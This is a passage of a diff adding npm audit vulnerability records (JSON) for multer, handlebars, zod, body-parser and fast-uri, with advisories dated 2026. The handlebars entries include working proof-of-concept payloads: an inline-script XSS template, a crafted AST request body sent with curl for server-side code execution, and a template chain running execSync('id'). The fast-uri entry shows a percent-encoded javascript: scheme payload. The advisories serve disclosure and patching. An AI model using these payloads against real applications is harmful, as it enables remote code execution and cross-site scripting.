+      "updated": "2026-09-02T14:45:15.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-4mjr-xmp4-gh2g"
+    },
+    "1193790": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-wc9g-mqfw-jrwm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-77078\n- https://github.com/expressjs/multer/commit/87a584e8c8d4da873292635fa1d8c4d78d985b76\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/multer/releases/tag/v2.3.0\n- https://github.com/advisories/GHSA-wc9g-mqfw-jrwm",
+      "created": "2026-09-08T21:30:20.000Z",
+      "id": 1193790,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA vulnerability in multer allows a remote, unauthenticated attacker to crash the Node.js process with a single `multipart/form-data` request. Two specially crafted text field names cause an uncaught `RangeError: Invalid array length` inside multer's field parsing, which is not routed to the application error handler and terminates the process. All applications using multer to parse multipart requests are affected.\n\n### Patches\n\nUsers should upgrade to `2.3.0`.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "multer vulnerable to Denial of Service via crafted multipart field names",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-77078"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": "<2.3.0",
+      "github_advisory_id": "GHSA-wc9g-mqfw-jrwm",
+      "recommendation": "Upgrade to version 2.3.0 or later",
+      "patched_versions": ">=2.3.0",
+      "updated": "2026-09-08T21:30:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-wc9g-mqfw-jrwm"
+    },
+    "1193792": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-qvfw-j98x-7q72\n- https://nvd.nist.gov/vuln/detail/CVE-2026-77063\n- https://github.com/expressjs/multer/commit/ab6aeae650328cf31799dcfa4c3e116ba8faaacc\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/multer/releases/tag/v2.3.0\n- https://github.com/advisories/GHSA-qvfw-j98x-7q72",
+      "created": "2026-09-08T21:29:42.000Z",
+      "id": 1193792,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen `multer` is configured with an asynchronous `fileFilter`, the `limits.fileSize` limit can be bypassed. The `'limit'` event is registered inside the async `fileFilter` callback, so if a file exceeds `limits.fileSize` before that callback runs, the event is missed and the oversized upload is accepted instead of being rejected with a `LIMIT_FILE_SIZE` error. Applications that rely on `limits.fileSize` to reject oversized uploads are affected on all upload methods (`.single()`, `.array()`, `.fields()`, `.any()`). Uploads using a synchronous `fileFilter` are not affected.\n\n### Patches\n\nUsers should upgrade to `2.3.0`.\n\n### Workarounds\n\nUse a synchronous `fileFilter`, or validate the uploaded file size after the upload completes.",
+      "reported_by": null,
+      "title": "multer vulnerable to file size limit bypass via async fileFilter race condition",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-77063"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "multer",
+      "vulnerable_versions": "<2.3.0",
+      "github_advisory_id": "GHSA-qvfw-j98x-7q72",
+      "recommendation": "Upgrade to version 2.3.0 or later",
+      "patched_versions": ">=2.3.0",
+      "updated": "2026-09-08T21:29:43.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-362"
+      ],
+      "url": "https://github.com/advisories/GHSA-qvfw-j98x-7q72"
+    },
+    "1193793": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-535w-7cp7-47q4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82333\n- https://github.com/expressjs/multer/pull/1438\n- https://github.com/expressjs/multer/commit/73c1759fa93b87366bc6dbd7abe1b80ddff7d27c\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/multer/releases/tag/v2.3.0\n- https://github.com/advisories/GHSA-535w-7cp7-47q4",
+      "created": "2026-09-08T21:28:43.000Z",
+      "id": 1193793,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nmulter is vulnerable to a Denial of Service (DoS) via a crafted array index in multipart field names. The `append-field` dependency parses bracket notation in field names, and a large numeric index such as `items[4294967294]` forces allocation of a maximum-length sparse array. A following field with a non-numeric key on the same base then converts that array to an object by iterating its full length, which consumes CPU synchronously and leaves the process unable to handle other requests. A single HTTP request with a crafted multipart body is sufficient to exploit this, and it affects multer 1.x and 2.x.\n\n### Patches\n\nUsers should upgrade to `2.3.0` and configure `limits.fieldArrayIndexLimit` to the minimum array index their application requires.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "multer vulnerable to Denial of Service via oversized array index in field names",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82333"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": "<2.3.0",
+      "github_advisory_id": "GHSA-535w-7cp7-47q4",
+      "recommendation": "Upgrade to version 2.3.0 or later",
+      "patched_versions": ">=2.3.0",
+      "updated": "2026-09-08T21:28:45.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-535w-7cp7-47q4"
+    },
+    "1241676": {
+      "findings": [
+        {
+          "version": "4.7.9",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xw65-4hp5-5hc7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-106444\n- https://github.com/handlebars-lang/handlebars.js/pull/2185\n- https://github.com/handlebars-lang/handlebars.js/commit/609d1b11c833c9a3e00f56f2f34d22f425446725\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10\n- https://github.com/advisories/GHSA-xw65-4hp5-5hc7",
+      "created": "2026-10-08T17:52:37.000Z",
+      "id": 1241676,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`Handlebars.precompile()` generates JavaScript source that is commonly embedded in browser `<script>` elements. Before the fix, static template text containing `</script>` was emitted unchanged. HTML parsers recognize `</script>` even inside a JavaScript string literal, closing the surrounding script element and allowing following attacker-controlled markup to be parsed and executed.\n\nThis affects applications that precompile attacker-controlled templates and embed the generated source directly in an HTML `<script>` element. It does not affect ordinary server-side rendering or precompiled templates delivered as external JavaScript files.\n\n## Details\n\nStatic text is serialized by `quotedString()` in `lib/handlebars/compiler/code-gen.js`. The generated JavaScript is valid, but JavaScript quoting alone does not make it safe to embed in HTML. In HTML script data, the sequence `</script>` terminates the element regardless of JavaScript string context.\n\nOn affected releases, this template:\n\n```handlebars\nsafe</script><script>alert(\"XSS\")</script><script>\n```\n\ncould produce generated source containing:\n\n```js\nreturn 'safe</script><script>alert(\"XSS\")</script><script>';\n```\n\nWhen included inline in an HTML document, the first `</script>` closes the script containing the precompiled template. The next `<script>` element is then parsed as HTML and executes.\n\n## Proof of Concept\n\n```js\nconst Handlebars = require('handlebars');\n\nconst template = 'safe</script><script>alert(\"XSS\")</script><script>';\nconst output = Handlebars.precompile(template);\n\nconsole.log(output.includes('</script>'));\n```\n\nAffected versions print `true`. Embedding `output` directly in an inline `<script>` element allows the injected script tag to be parsed by the browser.\n\n## Workarounds\n\n- Do not inline precompiled output from untrusted templates into HTML documents.\n- Serve generated precompiled templates as external JavaScript files where practical.\n\n## Credits\n\nReported by Curly-Haired-Baboon Aka Laplas",
+      "reported_by": null,
+      "title": "Handlebars: JavaScript Injection via Unsafe Inline Embedding of Precompiled Templates",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-106444"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.9",
+      "github_advisory_id": "GHSA-xw65-4hp5-5hc7",
+      "recommendation": "Upgrade to version 4.7.10 or later",
+      "patched_versions": ">=4.7.10",
+      "updated": "2026-10-08T17:52:39.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-xw65-4hp5-5hc7"
+    },
+    "1241677": {
+      "findings": [
+        {
+          "version": "4.7.9",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-8r5x-fm3f-whwj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-106446\n- https://github.com/handlebars-lang/handlebars.js/pull/2185\n- https://github.com/handlebars-lang/handlebars.js/commit/703fdcc5fd6cc8d1cc0c33cc19de40c467c4b8d2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10\n- https://github.com/advisories/GHSA-8r5x-fm3f-whwj",
+      "created": "2026-10-08T17:52:32.000Z",
+      "id": 1241677,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`Handlebars.compile()` and `Handlebars.precompile()` accept a pre-parsed AST as well as a template string. Handlebars 4.7.9 added validation for such ASTs. It only checks values on `PathExpression`, `NumberLiteral` and `BooleanLiteral` nodes, and the compiler still writes several other AST values into the generated JavaScript unchecked.\n\nIf an application passes an untrusted object to `compile()` or `precompile()`, such as a parsed JSON request body, that object can carry arbitrary JavaScript. With `compile()`, the code runs on the server when the template renders. With `precompile()`, it ends up in the precompiled output and runs wherever that output is loaded.\n\nApplications that only ever pass template **strings** are not affected.\n\nThis bypasses the AST validation added in 4.7.9 for GHSA-2w6w-674q-4c4q, GHSA-xhpv-hc6g-r9c6 and GHSA-3mfm-83xf-c92r.\n\n## Details\n\nThe 4.7.9 validator runs in `parseWithoutProcessing()` and walks the whole AST. It only checks values on nodes whose `type` is `PathExpression`, `NumberLiteral` or `BooleanLiteral`. It passes over plain objects without a `type`, and over strings and other non-object values. The compiler reads these values from other places and writes them into the generated code as-is:\n\n| AST value | Written into generated code as | Compile options needed |\n| --- | --- | --- |\n| `Program.blockParams.length` | `container.program(<index>, data, <length>)` | none (default options) |\n| `depth` on a param that is not a `PathExpression`, e.g. a `StringLiteral` | `depths[<depth>]` | `stringParams: true` |\n| A `StringLiteral.value` that is not a string | raw JavaScript literal | `stringParams: true` |\n| A `PathExpression.original` that is not a string | raw JavaScript literal | `stringParams: true` |\n\nThe first row works with default options. A `Program` with `blockParams: { \"length\": \"<JS expression>\" }` passes validation because:\n\n1. the `blockParams` object has no `type`, so none of the type-specific checks apply, and\n2. the walker skips the string under `length` because it is not an object.\n\nThe compiler then reads `program.blockParams.length` and writes the string directly into the template function. The `container.program(...)` call is part of the helper options object, which is built before the helper is looked up. The code therefore runs on render even if the block's helper does not exist.\n\n## Proof of Concept\n\n1. Start a server that compiles request input:\n\n```js\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) => {\n  const template = Handlebars.compile(req.body.text); // `text` may be an object, not a string\n  res.send(template());\n});\n\napp.listen(2123);\n```\n\n2. Save this request body as `poc.json`. `missingHelper` does not need to exist:\n\n```json\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } },\n    \"body\": [\n      {\n        \"type\": \"BlockStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\", \"data\": false, \"depth\": 0,\n          \"parts\": [\"missingHelper\"], \"original\": \"missingHelper\",\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"params\": [],\n        \"program\": {\n          \"type\": \"Program\",\n          \"blockParams\": {\n            \"length\": \"(()=>{throw new Error('Injected code ran as uid ' + process.getuid())})()\"\n          },\n          \"body\": [],\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"openStrip\": { \"open\": false, \"close\": false },\n        \"inverseStrip\": { \"open\": false, \"close\": false },\n        \"closeStrip\": { \"open\": false, \"close\": false },\n        \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n      }\n    ]\n  }\n}\n```\n\n3. Send the request:\n\n```sh\ncurl -s -X POST 'http://127.0.0.1:2123/api/render' \\\n     -H 'Content-Type: application/json' --data-binary @poc.json\n```\n\nThe server responds with HTTP 500 and an error page showing the injected code ran inside the Node.js process:\n\n```\nError: Injected code ran as uid 1000\n```\n\n## Impact\n\nAn application is affected if untrusted input can reach `Handlebars.compile()` or `Handlebars.precompile()` as an object instead of a string. A common way this happens is passing a field from a JSON request body straight to `compile()`.\n\n- **`compile()`**: arbitrary JavaScript runs in the Node.js process with the application's privileges (remote code execution).\n- **`precompile()`**: the injected code is written into the precompiled template and runs wherever that template is loaded, for example in users' browsers.\n\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.\n\n## Credits\n\n### Variant `Program.blockParams`\n- [Nick Mykhailyshyn - @whoareme](https://x.com/whoareme33)\n- [jmoritzc53 ](https://github.com/jmoritzc53)\n- [bhaswanthc ](https://github.com/bhaswanthc)\n- [dinhvaren ](https://github.com/dinhvaren)\n- [n0tra4e ](https://github.com/n0tra4e) \n- [PellaML](https://github.com/PellaML)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [sanmatte](https://github.com/sanmatte)\n\n### Variant `BooleanLiteral|NumberLiteral.value`\n\n- [sondt99 ](https://github.com/sondt99) Thai Son Dinh from VinSOC Labs (R&D)\n- [Ahmed-Elmahgob ](https://github.com/Ahmed-Elmahgob)\n- [nikolakojic-rasit ](https://github.com/nikolakojic-rasit)\n- [vk-can](https://github.com/vk-can)\n- [shenhuanageshei](https://github.com/shenhuanageshei)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [ffasterss](https://github.com/ffasterss)\n\n### Variant `PathExpression.depth`\n\n- [hibrian827](https://github.com/hibrian827) Team Atlanta\n- [oss-security-shopify](https://github.com/oss-security-shopify)",
+      "reported_by": null,
+      "title": "Handlebars: JavaScript Injection via AST Type Confusion in compile (bypass of CVE-2026-33937)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-106446"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.9",
+      "github_advisory_id": "GHSA-8r5x-fm3f-whwj",
+      "recommendation": "Upgrade to version 4.7.10 or later",
+      "patched_versions": ">=4.7.10",
+      "updated": "2026-10-08T17:52:34.000Z",
+      "cvss": {
+        "score": 9.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-843"
+      ],
+      "url": "https://github.com/advisories/GHSA-8r5x-fm3f-whwj"
+    },
+    "1242173": {
+      "findings": [
+        {
+          "version": "4.7.9",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-p8wg-vrv2-v86f\n- https://nvd.nist.gov/vuln/detail/CVE-2026-106445\n- https://github.com/handlebars-lang/handlebars.js/pull/2185\n- https://github.com/handlebars-lang/handlebars.js/commit/ceec388abe1d1aac8f6369860d5f390fa71ef4fa\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10\n- https://github.com/advisories/GHSA-p8wg-vrv2-v86f",
+      "created": "2026-10-08T17:52:26.000Z",
+      "id": 1242173,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nHandlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`lookupProperty` trusts own properties:\n\n```js\nif (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n  return result;\n}\n```\n\nNormally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:\n\n```js\nFunction.prototype.constructor === Function;\nString.prototype.constructor === String;\nObject.prototype.constructor === Object;\n```\n\nAs a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.\n\n## Proof of Concept\n\nAn attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requires only an accessible function in the template context:\n\n1. Access a function's prototype: {{lookup myFunction \"proto\"}} resolves to Function.prototype. The proto property is not in the deny list and is permitted when allowProtoMethodsByDefault is true (since the result is a function).\n2. Access constructor via own property bypass: {{lookup (lookup myFunction \"\\_\\_proto__\") \"constructor\"}} resolves to Function. Because Function.prototype.constructor is an own property of Function.prototype, hasOwnProperty returns true and lookupProperty returns the value without calling resultIsAllowed. The deny list entry constructor: false is never evaluated.\n3. Construct and execute arbitrary code: The attacker uses Function to create a function with attacker-controlled body content and triggers its execution through Handlebars' template rendering mechanics (e.g., #with calling functions, lambda processing, or #each iteration combined with apply).\n\n```javascript\nconst Handlebars = require('handlebars');\n\n// constructor deny list bypass via hasOwnProperty check in lookupProperty\nconst template = Handlebars.compile(\n    // construct code array from template string literal\n    '{{#with a}}' +\n      '{{lookup \"\" (push \"return process.mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()\")}}' +\n      '{{lookup \"\" (pop)}}' +\n      '{{lookup \"\" (shift)}}' +\n    '{{/with}}' +\n\n    // access Function via own property bypass on Function.prototype.constructor\n    '{{lookup \"\" (@root.a.push (lookup (lookup fn \"__proto__\") \"constructor\"))}}' +\n\n    // #each sets depth0=Function without calling it, apply avoids hash body\n    '{{#each @root}}{{#if @index}}{{else}}' +\n      '{{#with (this.apply null @root.a)}}{{this}}{{/with}}' +\n    '{{/if}}{{/each}}'\n);\n\nconst result = template(\n    { fn: function(){}, a: [0] },\n    { allowProtoMethodsByDefault: true }\n);\n\nconsole.log(result.trim());\n\n// output: uid=1000(node) gid=1000(node) groups=1000(node)\n```\n\n## Workarounds\n\nDo not set `allowProtoMethodsByDefault: true` when compiling untrusted templates with untrusted data.\n\nIf you are using packages like [hbs](https://www.npmjs.com/package/hbs) which set `allowProtoMethodsByDefault: true` by default, you have to update Handlebars to the latest version.",
+      "reported_by": null,
+      "title": "Handlebars: JavaScript Injection via Own Property Check Bypass",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-106445"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=3.0.0 <=4.7.9",
+      "github_advisory_id": "GHSA-p8wg-vrv2-v86f",
+      "recommendation": "Upgrade to version 4.7.10 or later",
+      "patched_versions": ">=4.7.10",
+      "updated": "2026-10-12T14:33:17.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-184",
+        "CWE-1289"
+      ],
+      "url": "https://github.com/advisories/GHSA-p8wg-vrv2-v86f"
+    },
+    "1243066": {
+      "findings": [
+        {
+          "version": "3.25.76",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-54404\n- https://github.com/colinhacks/zod/issues/1872\n- https://github.com/colinhacks/zod/pull/6475\n- https://www.vulncheck.com/advisories/zod-uncontrolled-resource-consumption-via-array-validation\n- https://github.com/colinhacks/zod/pull/6652\n- https://github.com/colinhacks/zod/commit/a0ebf970f2d752e5f58527cd2942ff48be4f46bd\n- https://github.com/advisories/GHSA-mrhx-c7xc-m3w5",
+      "created": "2026-10-01T18:32:46.000Z",
+      "id": 1243066,
+      "npm_advisory_id": null,
+      "overview": "Zod schema-validation library through 4.6.5 contains an uncontrolled resource consumption vulnerability that allows attackers to exhaust memory by submitting a large array to an application using an array schema without a length constraint. Attackers can exploit the handleArrayResult parse logic in $ZodArray, which accumulates every validation issue for each failing element with no cap or early termination, causing the process to allocate excessive issue objects and crash due to out-of-memory conditions.",
+      "reported_by": null,
+      "title": "Zod can exhaust memory while validating oversized constrained collections",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-54404"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "zod",
+      "vulnerable_versions": "<4.6.6",
+      "github_advisory_id": "GHSA-mrhx-c7xc-m3w5",
+      "recommendation": "Upgrade to version 4.6.6 or later",
+      "patched_versions": ">=4.6.6",
+      "updated": "2026-10-23T18:26:52.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-mrhx-c7xc-m3w5"
+    },
+    "1243073": {
+      "findings": [
+        {
+          "version": "1.20.4",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/body-parser/security/advisories/GHSA-27r3-jxmh-p828\n- https://nvd.nist.gov/vuln/detail/CVE-2026-111181\n- https://github.com/expressjs/body-parser/commit/1260c3845f54502a05a87594f09a334786bb34d7\n- https://github.com/expressjs/body-parser/commit/f7075eae3a84c3473ab4bf0a777da28db208e916\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/body-parser/releases/tag/1.20.9\n- https://github.com/expressjs/body-parser/releases/tag/v2.4.0\n- https://github.com/advisories/GHSA-27r3-jxmh-p828",
+      "created": "2026-10-23T20:53:11.000Z",
+      "id": 1243073,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA single request can crash any application using `body-parser` with default options. When a request carries a `Content-Encoding` (for example `gzip`), `body-parser` pipes it into a decompression stream and, after reading the body, leaves that stream piped with no error listener. A payload of one valid compressed frame followed by trailing bytes decodes and the application responds normally, but the trailing bytes then reach the already-finished decoder, which emits an error that is re-thrown as an uncaught exception and terminates the process. No authentication or matching route is required, since parsing runs before routing.\n\n### Patches\n\nFixed in body-parser 2.4.0 and 1.20.9. Upgrade to one of these versions.\n\n### Workarounds\n\nPass `inflate: false` to the body-parser middleware if the application does not need to accept compressed request bodies. This rejects encoded requests before any decompression stream is created.",
+      "reported_by": null,
+      "title": "body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111181"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "body-parser",
+      "vulnerable_versions": "<1.20.9",
+      "github_advisory_id": "GHSA-27r3-jxmh-p828",
+      "recommendation": "Upgrade to version 1.20.9 or later",
+      "patched_versions": ">=1.20.9",
+      "updated": "2026-10-23T20:53:12.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-27r3-jxmh-p828"
+    },
+    "1243083": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-q7qp-rjg7-q26m\n- https://nvd.nist.gov/vuln/detail/CVE-2026-113872\n- https://github.com/expressjs/multer/commit/80a2d9df1dfd63b5fab631b8b9966164ed647adf\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/multer/releases/tag/v2.5.0\n- https://github.com/advisories/GHSA-q7qp-rjg7-q26m",
+      "created": "2026-10-23T22:08:22.000Z",
+      "id": 1243083,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen `multer` is configured with an asynchronous `fileFilter`, a single request can crash the Node.js process. If a request is aborted (for example when one file is rejected) while another file's async `fileFilter` is still pending, the pending callback later resumes a parsing stream that multer has already torn down. busboy then emits an error on a stream that no longer has an error listener, which Node raises as an unhandled `'error'` event, and the process exits. A single unauthenticated request is enough, so any application using `multer` with an asynchronous `fileFilter` is affected, regardless of storage engine. Uploads using a synchronous `fileFilter` are not affected.\n\n### Patches\n\nUsers should upgrade to `multer` `2.5.0` or later.\n\n### Workarounds\n\nUse a synchronous `fileFilter`.",
+      "reported_by": null,
+      "title": "multer vulnerable to Denial of Service via a pending asynchronous fileFilter after request teardown",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-113872"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": ">=2.0.0 <2.5.0",
+      "github_advisory_id": "GHSA-q7qp-rjg7-q26m",
+      "recommendation": "Upgrade to version 2.5.0 or later",
+      "patched_versions": ">=2.5.0",
+      "updated": "2026-10-23T22:08:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-404"
+      ],
+      "url": "https://github.com/advisories/GHSA-q7qp-rjg7-q26m"
+    },
+    "1243098": {
+      "findings": [
+        {
+          "version": "3.1.8",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-w74x-v6f9-j3xg\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110306\n- https://github.com/fastify/fast-uri/commit/39933a1f1422986f14e2d844f552238feb40f5d4\n- https://github.com/fastify/fast-uri/commit/597f254c86d151568511eeb9a1df761fd12520b3\n- https://github.com/fastify/fast-uri/commit/e60e716f41d1d73717e2d803d20b68d2c6d20a0f\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-w74x-v6f9-j3xg",
+      "created": "2026-10-23T21:41:36.000Z",
+      "id": 1243098,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` percent-decodes the scheme component with the legacy global `unescape()` before validating it, so an input whose decoded scheme is a valid but dangerous token is emitted as a live scheme. RFC 3986 section 3.1 does not allow percent-encoding in a scheme, so no RFC or WHATWG parser treats such input as having that scheme, but `fast-uri` does.\n\nFor example, `normalize('%6Aavascript:alert(1)')` returns `javascript:alert(1)`, `resolve('https://a.example/', '%6Aavascript:alert(1)')` returns `javascript:alert(1)`, and `parse('%6Aavascript:alert(1)').scheme` returns `javascript`. The `%uXXXX` form (`%u006Aavascript:`) produces the same result, and `equal('%68ttp://a/', 'http://a/')` returns `true`.\n\nAn application that screens dangerous schemes on the raw input and then stores or renders `normalize(input)` or `resolve(base, input)` turns an inert string into an executable `javascript:`, `data:`, or `vbscript:` URL, a stored or reflected cross-site scripting vector in the consuming application. `equal()` also treats an encoded and a plain scheme as the same, which can bypass equality-based allowlists.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nReject input whose scheme part (before the first `:`, and before any `/`, `?`, or `#`) contains `%`. Alternatively, check `parse(x).scheme` against an allowlist after normalization and use that same parsed result rather than the raw string.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to URI scheme spoofing via percent-encoded scheme decoding",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110306"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.9",
+      "github_advisory_id": "GHSA-w74x-v6f9-j3xg",
+      "recommendation": "Upgrade to version 3.1.9 or later",
+      "patched_versions": ">=3.1.9",
+      "updated": "2026-10-23T21:41:38.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-172",
+        "CWE-180"
+      ],
+      "url": "https://github.com/advisories/GHSA-w74x-v6f9-j3xg"
+    },
+    "1243101": {
+      "findings": [
+        {
+          "version": "3.1.8",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
